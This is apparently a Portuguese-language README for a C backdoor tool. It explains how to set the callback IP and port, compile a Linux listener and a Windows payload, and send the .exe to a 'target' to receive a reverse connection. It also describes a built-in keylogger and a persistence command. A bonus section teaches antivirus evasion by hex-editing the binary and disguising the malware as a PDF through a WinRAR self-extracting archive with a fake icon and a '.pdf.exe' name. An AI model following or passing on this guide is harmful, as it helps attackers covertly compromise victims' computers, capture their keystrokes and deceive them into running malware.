# Backdoor C
Backdoor Feita em C com algumas 2 funcionalidades extras 
## Pre-requisitos
Você ira precisar ter o gcc instalado
```
sudo apt install gcc
```
Ira precisar do mingw
```
sudo apt install mingw-w64
```
E também ira precisar de qualquer editor de texto
## Como deixar funcional
Primeiro abra o arquivo ```Backdoor.c``` e modifique as linhas 145 e 146 mudando o endereço IP e porta

Depois faça o mesmo no ```server.c``` porem nas linhas 28 e 29 depois basta compilar
## Como compilar
Primeiro vamos compilar o ```server.c``` usando o ```gcc```
```
gcc server.c -o ArquivoFinal
```
Depois de compilado vamos para o arquivo principal 
porem iremos compilar para Windows 32bits então usaremos o ```mingw```
<details>
  <summary>:zap: Por que 32bits ?</summary>

  Quando compilado em 32bits ele ira poder rodar em qualquer computador windows inclusive  64bits

</details>

```
i686-w64-mingw32-gcc -o NomeDaBackdoor.exe Backdoor.c -lwsock32 -lwininet
```
## Como usar 
Primeiro iremos iniciar o listener em nossa maquina
```
./ArquivoFinal
```
Depois enviamos o aquivo ```.exe``` para o "Alvo"

E logo quando ele executar o arquivo iremos receber uma conexao reversa
## Comandos
As 2 funcionalidades extras sao um keylogger e uma persistencia

executando o comando 
```
keylog_start
```
O seu keylogger ira iniciar ele ira salvar todas as saida do teclado em um arquivo chamado "windows.txt"

Para ler o arquivo com as saidas digite
```
type windows.txt
```
<details>
  <summary>:zap:oque e um keylogger ?</summary>
  
  keylogger nada mais e do que um programa que captura tudo que for digitado
</details>
O segundo comando e da persistencia

iniciamos ele executando 
```
persistence
```
Ele ira nos retornar uma saida nos dizendo a onde foi criada a persistencia


<details>
  <summary>:zap:oque e uma persistencia ?</summary>
  Persistencia e basicamento um script que quando executado ira fazer
  
  o seu malware ser executado sempre que o PC for ligado
</details>

# Bonus
Nesse bonus eu irie te mostras algumas formas de deixar sua backdoor "indetectavel"

## Modificando o codigo HEX
Eu irie te mostrar como modificar o codigo Hex da nossa backdoor 

Para deixar ela ainda mais indetectavel

Primeiro iremos usar um programa chamado ```ghex```

Para instalar o mesmo use 
```
sudo apt-get install ghex
```
Logo depois iremos abrir o editor em nosso arquivo .exe
```
ghex malware.exe
```
E ira ver algo parecido com isso


![Screenshot from 2020-09-16 13-06-16](https://user-images.githubusercontent.com/62577914/93418429-64418180-f878-11ea-86a6-09c611230ae3.png)


Agora nos iremos modificar apenas as strings
Voce deve modificar apenas na onde ta escrito "This program cannot be run in DOS"
Localize essa parte usando as setas do teclado 
voce podera inserir qualquer valor decimal
Voce tambem podera comentar no ```Backdoor.c``` coisa aleatorias que ira ajudar 

## Escondendo em arquivo PDF
voce ira precisar de um ico de um pdf qualquer e do malware(obvio)
e do [winrar](//www.win-rar.com/)

voce podera encotrar a imagem no [Iconfinder](https://www.iconfinder.com/)
entao pesquise por PDF e escolha a desejada
voce ira ver algo parecido com isso 
![Screenshot from 2020-09-17 00-16-36](https://user-images.githubusercontent.com/62577914/93419836-d4053b80-f87b-11ea-859d-6e7a21733121.png)
E entao clique em "Download Icon in PNG"

Mas nos nao queremos uma imagem .png mas sim .ico

entao usaremos o site [Icoconverte](https://icoconvert.com/)
clique em "choose file" e escolha imagem que baixamos anteriormente e entao clique em upload
![Screenshot from 2020-09-17 00-23-42](https://user-images.githubusercontent.com/62577914/93420439-e16ef580-f87c-11ea-8ed0-a2168d79861f.png)

E entao escolha o tamanho de 64x64 entao clique em "convert to ICO" depois basta baixar ela
![Screenshot from 2020-09-16 14-10-43](https://user-images.githubusercontent.com/62577914/93420787-b1742200-f87d-11ea-99a1-99a130719a6d.png)


Agora iremos juntar todos em um so

Primeiro selecione o arquivo PDF e o malware clique com o botao direito e va em "add to archive"
![Screenshot from 2020-09-16 14-04-03](https://user-images.githubusercontent.com/62577914/93420905-ff892580-f87d-11ea-831d-b4f04ab96787.png)
E entao no campo nome coloque 
```
nome do arquivo.pdf.exe
```
Fazendo isso ira automaticamente marcar uma opcao SFX

Depois fazendo isso va em advanced > advanced SFX options > setup

E em "Run after extraction" coloque o nome do arquiv ```pdf``` e em baixo o nome do ```malware```
![Screenshot from 2020-09-17 00-39-07](https://user-images.githubusercontent.com/62577914/93421243-cf8e5200-f87e-11ea-9676-c2c7e2b49988.png)

Depois va para ```modes``` e marque a opção ```[] Unpack to temporary folder``` e ```hide all```
assim como mostrado na imagen ![Screenshot from 2020-09-24 21-07-34](https://user-images.githubusercontent.com/62577914/94215613-375e2180-feab-11ea-9777-f918d8ecf93e.png)


Depois va em ```Text and icon``` e logo a baixo na opção ```Load SFX icon from the file``` 
clique em ```browser``` e selecione o ```.ico```que baixamos anteriormente

Depois va em ```update``` e marque a opção ```Extract and update files```
e tambem ```Overwrite all files``` 
Agora voce pode comfirmar tudo clicando em ```ok```

Apos fazer a confirmação o arquivo ira ser criado

visualmente se parece identico ao um arquivo pdf 
![Screenshot from 2020-09-24 21-24-47](https://user-images.githubusercontent.com/62577914/94216459-65446580-fead-11ea-890a-62a49219738d.png)

# E pronto seu arquivo PDF malicioso foi criado
# Caso queira esconder em uma imgem basta fazer o mesmo processo apenas subistituindo a extensão e nome
